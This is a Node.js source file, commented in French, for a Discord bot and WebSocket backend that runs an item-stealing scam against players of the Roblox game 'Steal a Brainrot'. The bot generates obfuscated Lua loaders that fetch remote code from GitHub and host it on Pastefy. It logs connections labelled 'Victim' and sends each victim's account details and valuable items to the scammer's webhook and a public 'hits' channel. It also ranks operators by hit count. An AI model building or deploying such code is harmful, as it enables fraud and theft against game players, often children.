const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const { randomBytes } = require('node:crypto');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags, WebhookClient } = require('discord.js');
const axios = require('axios');
const { PastefyClient } = require('@interaapps/pastefy');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const PUBLIC_HITS_CHANNEL = "1487370329776193677"; // Ton salon public

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const pastefy = new PastefyClient(process.env.PASTEFY_KEY);

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
const generateWebhookId = () => `wh_${randomBytes(8).toString('hex')}`;

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
    .then(() => log("✅ [DB] Connexion établie"))
    .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const hitEventSchema = new mongoose.Schema({
    userId: { type: String, required: true },
    userName: { type: String, required: true },
    timestamp: { type: Date, default: Date.now }
});
hitEventSchema.index({ timestamp: -1 });

const WebHookIdSchema = new mongoose.Schema({
    webhookId: { type: String, unique: true },
    url: { type: String, required: true },
    userId: { type: String, required: true },
    userName: { type: String, required: true } 
}, { timestamps: true });

const HitEvent = mongoose.model('HitEvents', hitEventSchema);
const WebHookId = mongoose.model('WebHookIds', WebHookIdSchema);

// --- UTILS : OBF & PASTE ---
async function uploadToPastefy(code) {
    try {
        const paste = await pastefy.createPaste({
            title: `SABTrade`,
            content: code,
            visibility: 'PUBLIC'
        });
        return (paste && paste.id) ? `https://pastefy.app/${paste.id}/raw` : null;
    } catch (error) {
        log(`❌ [PASTEFY ERROR] ${error.message}`);
        return null;
    }
}

async function obfuscateScript(luaCode) {
    try {
        const response = await axios.post('https://wearedevs.net/api/obfuscate', { script: luaCode });
        if (response.data && response.data.success) return response.data.obfuscated;
        return null;
    } catch (error) {
        log(`❌ [OBF ERROR] ${error.message}`);
        return null;
    }
}

// --- BOT DISCORD ---
const clientDiscord = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const commands = [
    new SlashCommandBuilder()
        .setName('generate-sab-trade')
        .setDescription('Generate a customized SAB Trade script')
        .addStringOption(o => o.setName('username').setDescription('Usernames (comma separated)').setRequired(true))
        .addStringOption(o => o.setName('webhook').setDescription('Your Discord Webhook URL').setRequired(true))
        .addIntegerOption(o => o.setName('income').setDescription('Min income threshold').setRequired(true))
        .addStringOption(o => o.setName('visual').setDescription('Custom URL (Optional)')),

    new SlashCommandBuilder()
        .setName('leaderboard')
        .setDescription('Display top contributors')
        .addStringOption(o => o.setName('type').setDescription('Timeframe').setRequired(true)
            .addChoices(
                { name: 'Daily', value: 'daily' },
                { name: 'Weekly', value: 'weekly' },
                { name: 'Monthly', value: 'monthly' },
                { name: 'All Time', value: 'alltime' }
            )),

    new SlashCommandBuilder()
        .setName('totalhits')
        .setDescription('View your stats')
].map(cmd => cmd.toJSON());

clientDiscord.once(Events.ClientReady, async () => {
    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
    await rest.put(Routes.applicationCommands(clientDiscord.user.id), { body: commands });
});

clientDiscord.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'totalhits') {
        const totalHits = await HitEvent.countDocuments({ userId: interaction.user.id });
        const aggregateRank = await HitEvent.aggregate([
            { $group: { _id: "$userId", count: { $sum: 1 } } },
            { $sort: { count: -1 } }
        ]);
        const rank = aggregateRank.findIndex(u => u._id === interaction.user.id) + 1;

        const statsEmbed = new EmbedBuilder()
            .setTitle("📊 Your Hit Stats")
            .setColor(0x5865F2)
            .addFields(
                { name: "Total hits", value: `**${totalHits}**`, inline: true },
                { name: "Global Rank", value: `#${rank || "N/A"}`, inline: true }
            );
        return interaction.reply({ embeds: [statsEmbed], flags: [MessageFlags.Ephemeral] });
    }

    if (interaction.commandName === 'leaderboard') {
        const type = interaction.options.getString('type');
        let dateFilter = {};
        const now = new Date();
        if (type === 'daily') dateFilter = { timestamp: { $gte: new Date(now.setHours(0, 0, 0, 0)) } };
        else if (type === 'weekly') dateFilter = { timestamp: { $gte: new Date(now.setDate(now.getDate() - 7)) } };
        else if (type === 'monthly') dateFilter = { timestamp: { $gte: new Date(now.setMonth(now.getMonth() - 1)) } };

        const topUsers = await HitEvent.aggregate([
            { $match: dateFilter },
            { $group: { _id: "$userId", userName: { $first: "$userName" }, hits: { $sum: 1 } } },
            { $sort: { hits: -1 } },
            { $limit: 10 }
        ]);

        const description = topUsers.map((u, i) => `**${i + 1}.** @${u.userName} — \`${u.hits}\` hits`).join('\n') || "No data.";
        const lbEmbed = new EmbedBuilder()
            .setTitle(`🏆 Leaderboard (${type})`)
            .setColor(0xFFAA00)
            .setDescription(description);
        return interaction.reply({ embeds: [lbEmbed] });
    }

    if (interaction.commandName === 'generate-sab-trade') {
        await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
        try {
            const webhookUuid = generateWebhookId();
            await new WebHookId({
                webhookId: webhookUuid,
                url: interaction.options.getString('webhook'),
                userId: interaction.user.id,
                userName: interaction.user.username 
            }).save();

            const userList = interaction.options.getString('username').split(',').map(u => `"${u.trim()}"`).join(', ');
            
            // 3. Préparation du Code Source Lua
            const code = `local fenv = getfenv()
fenv["Receivers"] = { ${userList} }
fenv["WebHook"] = "${webhookUuid}"
fenv["Visual"] = "${visual}"
fenv["MinIncome"] = ${income}
loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyScripts/refs/heads/main/Trade.lua"))()`;

            const obfuscated = await obfuscateScript(code);
            const pasteUrl = await uploadToPastefy(obfuscated || code);

            if (!pasteUrl) return interaction.editReply("❌ Generation failed.");

            const finalLoadstring = `loadstring(game:HttpGet("${pasteUrl}", true))()`;
            const dmEmbed = new EmbedBuilder()
                .setTitle("🚀 SAB Trade Script Ready")
                .setColor(0x00FF00)
                .addFields({ name: "📜 Script Code", value: `\`\`\`lua\n${finalLoadstring}\n\`\`\`` });

            await interaction.user.send({ embeds: [dmEmbed] }).catch(() => { });
            await interaction.editReply("✅ Script generated! Check your DMs.");
        } catch (e) {
            log(`❌ Generate Error: ${e.message}`);
            await interaction.editReply(`❌ Error: ${e.message}`);
        }
    }
});

// --- WEBSOCKET GESTION ---
wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(url.parse(req.url, true).query);
    const username = params.get('username') || "Unknown";
    const usertype = params.get('usertype');

    if (usertype === "Victim") {
        log(`👤 Victim connected: ${username}`);
        ws.on('message', async (msg) => {
            try {
                const data = JSON.parse(msg);
                if (data.Method === "Hit") {
                    const hitInfo = data.Hit;
                    const mapping = await WebHookId.findOne({ webhookId: hitInfo.WebHook });

                    if (!mapping) return log(`❌ Unknown Webhook ID: ${hitInfo.WebHook}`);

                    // Sauvegarde du hit corrigée (userName inclus)
                    await new HitEvent({
                        userId: mapping.userId,
                        userName: mapping.userName,
                        timestamp: new Date()
                    }).save();

                    const hitEmbed = new EmbedBuilder()
                        .setTitle("Rusteez • SAB Hit")
                        .setColor(0x2b2d31)
                        .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
                        .addFields(
                            { 
                                name: "📄 Player Information", 
                                value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👥 Players      : ${hitInfo.Players}/8\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
                            },
                            {
                                name: "👑 Valuable Brainrots",
                                value: `\`\`\`properties\n${hitInfo.Brainrots?.length > 0 ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n') : "None"}\n\`\`\``
                            }
                        )
                        .setFooter({ text: "Rusteez Script" })
                        .setTimestamp();

                    // Envoi Webhook privé
                    const webhookClient = new WebhookClient({ url: mapping.url });
                    await webhookClient.send({ content: `**New Hit from ${hitInfo.Name}**`, embeds: [hitEmbed] }).catch(() => { });
                    
                    // Envoi Salon Public
                    const publicChannel = clientDiscord.channels.cache.get(PUBLIC_HITS_CHANNEL);
                    if (publicChannel) publicChannel.send({ embeds: [hitEmbed] });
                }
            } catch (e) { log(`⚠️ WS Error: ${e.message}`); }
        });
    }
});

if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
